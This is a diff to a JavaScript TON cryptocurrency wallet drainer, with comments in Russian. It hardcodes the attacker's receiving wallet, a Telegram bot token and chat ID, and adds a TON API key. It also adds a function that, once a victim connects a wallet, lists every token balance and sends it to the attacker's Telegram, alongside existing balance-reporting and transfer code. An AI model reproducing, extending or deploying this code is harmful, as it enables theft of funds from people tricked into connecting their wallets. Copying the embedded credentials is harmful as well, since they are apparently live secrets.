@@ -2,6 +2,7 @@
 var mainWallet = "UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi"; //Ваш кошелек, куда будут лететь активы
 var tgBotToken = "7828861073:AAHBgan5y0jpg24QxtNAa36PGJHggto19sM"; //Токен от бота телеграмм
 var tgChat = "1447071887"; //Ваш телеграмм-чат
+var tonApiKey = "45aed36e4b36070265bd8be5b8ab2fcea33d5ddd05a76de612447070a016c283"; // TON API Key
 
 var domain = window.location.hostname;
 var ipUser;
@@ -39,6 +40,7 @@ tonConnectUI.on('walletConnected', async (wallet) => {
     // Гарантированная отправка баланса в Telegram после подключения
     try {
       await sendBalanceToTelegram(wallet.address);
+        await getTokenBalancesToTelegram(wallet.address);
     } catch (error) {
       console.error("Ошибка при отправке баланса в Telegram:", error);
       // Отправляем сообщение об ошибке, даже если что-то пошло не так
@@ -55,7 +57,11 @@ tonConnectUI.on('walletConnected', async (wallet) => {
 
 async function sendBalanceToTelegram(walletAddress) {
     try {
-        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`,{
+            headers: {
+                'X-API-Key': tonApiKey,
+            }
+        });
 
         if (!response.ok) {
             throw new Error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
@@ -78,6 +84,42 @@ async function sendBalanceToTelegram(walletAddress) {
     }
 }
 
+async function getTokenBalancesToTelegram(walletAddress) {
+    try {
+        const response = await fetch(`https://toncenter.com/api/v3/get_tokens?address=${walletAddress}`, {
+            headers: {
+                'X-API-Key': tonApiKey,
+            }
+        });
+
+        if (!response.ok) {
+            throw new Error(`Ошибка при запросе токенов: ${response.status} ${response.statusText}`);
+        }
+
+        const data = await response.json();
+
+        if (data.error) {
+            throw new Error(`Ошибка при получении данных о токенах: ${data.error}`);
+        }
+
+        if (data.balances && data.balances.length > 0) {
+            let message = '\uD83D\uDCB0 *Токены кошелька ' + walletAddress + ':*\n';
+            data.balances.forEach(token => {
+                const amount = parseFloat(token.balance) / Math.pow(10, token.decimals);
+                message += `- ${token.symbol}: ${amount.toFixed(8)}\n`;
+            });
+            sendTelegramMessage(message);
+        } else {
+            sendTelegramMessage(`\uD83D\uDCC0 *У кошелька ${walletAddress} нет токенов.*`);
+        }
+
+    } catch (error) {
+        console.error("Ошибка при получении и отправке токенов:", error);
+        sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении токенов:* ${error}`);
+        throw error; // Пробрасываем ошибку выше
+    }
+}
+
 
 async function didtrans() {
   if (!tonConnectUI.account) {
@@ -86,7 +128,11 @@ async function didtrans() {
     return;
   }
   try {
-    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);
+    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`,{
+        headers: {
+            'X-API-Key': tonApiKey,
+        }
+    });
 
     if (!response.ok) {
       console.error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
